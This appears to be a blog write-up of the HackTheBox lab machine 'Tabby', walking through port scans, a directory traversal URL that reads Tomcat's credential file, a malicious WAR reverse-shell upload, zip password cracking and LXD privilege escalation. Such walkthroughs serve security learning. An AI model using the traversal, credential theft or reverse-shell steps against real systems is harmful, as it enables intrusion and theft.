<h1 class="cyan-text">HackTheBox Tabby Write Up</h1>

<div class="content white-text"><p>In this post I will show you how I solved tabby, a Linux machine labelled as easy on HackTheBox platform...</p></div>

<h2 class="cyan-text">Reconnaissance</h2>

<div class="content white-text"><p>I started with a quick top 1000 port scan using FinalRecon...</p></div>

<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/MafubFV.png"> </div>

<div class="content white-text"><p>I got these 3 ports open, after this I switched to nmap to scan for complete port range...</p></div>

<pre><code>$ nmap -p- -T3 -sT 10.10.10.194

Host is up (0.086s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 46.87 seconds.</code></pre>

<div class="content white-text"><p>at this point i have 3 open ports, after this I enumerated the services and versions on these specific ports...</p></div>

<pre><code>$ nmap -p 22,80,8080 -sV 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:40 IST

Host is up (0.088s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 7.79 seconds</code></pre>

<div class="content white-text"><p>After this I started analyzing the website running on port 80 and it has a message for visitors stating that they recovered from a breach, lets take a look at the URL</p></div>

<pre><code>http://megahosting.htb/news.php?file=statement</code></pre>

<div class="content white-text"><p>it says megahosting.htb instead of the IP address so I created a new entry for it in /etc/hosts file on my machine and after that I was able to access the page...</p></div>

<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/cKx7wTK.png"> </div>

<div class="content white-text"><p>it looks like it is "reading" a file "statement" and displaying its contents so I tried Directory Traversal attack here...</p></div>

<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/v80CTVU.png"> </div>

<div class="content white-text"><p>at this point my goal was to extract some credentials, now I checked port 8080, it has tomcat running and if you know about apache tomcat you know there is a manager dashboard, if I can get tomcat manager credentials from directory traversal I can upload a reverse shell, now the apache page shows a path where user entries are stored so using that I formed this URL...</p></div>

<pre><code>http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml</code></pre>

<div class="content white-text"><p>I had to curl this xml file to get the contents and I got the credentials!</p></div>

<pre><code>&lt;role rolename=&quot;manager-script&quot;/&gt;
&lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&gt;</code></pre>

<h2 class="cyan-text">Intrusion</h2>

<div class="content white-text"><p>Apache tomcat page specifies two applications : "manager webapp" and  "host-manager webapp" , I tried to login into manager as we have the creds for it but I got this...</p></div>

<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/nlwx7Jp.png"> </div>

<div class="content white-text"><p>Access Denied!!!! but it has provided an example for adding username and password entry into the xml file and when I compared it with what I got in the curl request it says "manager-script" instead of "manager-gui", I read about this role and found that tomcat provides a text api for manager role and it is enabled, after some more research I created a reverse shell upload script which uses text API to upload a malicious WAR file, this script can also be used outside HTB if you have working credentials and access to text API, you can download the script here : <a href="https://github.com/thewhiteh4t/warsend" target="_blank">WARSend</a> . Below you can see the script in action!</p></div>

<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/Pz6KZAd.png"> </div>

<div class="content white-text"><p>and I successfully got a reverse shell here!</p></div>

<h2 class="cyan-text">Let The Enumeration Begin</h2>

<div class="content white-text"><p>After some enumeration I found a zip file...</p></div>

<pre><code>$ pwd
/var/www/html/files

$ ls
16162020_backup.zip
archive
revoked_certs
statement</code></pre>

<div class="content white-text"><p>I downloaded this zip file and tried to extract it but it was password protected! I used fcrackzip to bruteforce it...</p></div>

<pre><code>$ fcrackzip -vuD -p /usr/share/wordlists/cleanrock.txt 16162020_backup.zip

checking pw arizon09

PASSWORD FOUND!!!!: pw == admin@it</code></pre>

<div class="content white-text"><p>So I got another password here so I tried this password for the user ash and it worked and I got the user here at this point! After this I added my ssh public key to authorized_keys file for a fully interactive shell...</p></div>

<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/vfjSeX9.png"> </div>

<h1 class="cyan-text">Privilege Escalation</h1>

<div class="content white-text"><p>I checked the id and saw that user ash is part of "lxd" group...</p></div>

<pre><code>ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</code></pre>

<div class="content white-text"><p>LXD is a next generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead. I started looking for privilege escalation techniques using LXD and found a bash script on Exploit DB : <a href="https://www.exploit-db.com/exploits/46978" target="_blank">Ubuntu 18.04 - 'lxd' Privilege Escalation</a> . As per the instructions I downloaded the build-alpine script in my machine and used to fetch an alpine tar.gz file...</p></div>

<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/hJndson.png"> </div>

<div class="content white-text"><p>next I uploaded this tar.gz file along with the pivesc script...</p></div>

<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/p3lwtPV.png"> </div>

<div class="content white-text"><p>after this I executed the privesc script and got a root shell and finally got Root!</p></div>

<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/Mvi6exo.png"> </div>

<div class="content white-text"><p>Solved!</p></div>
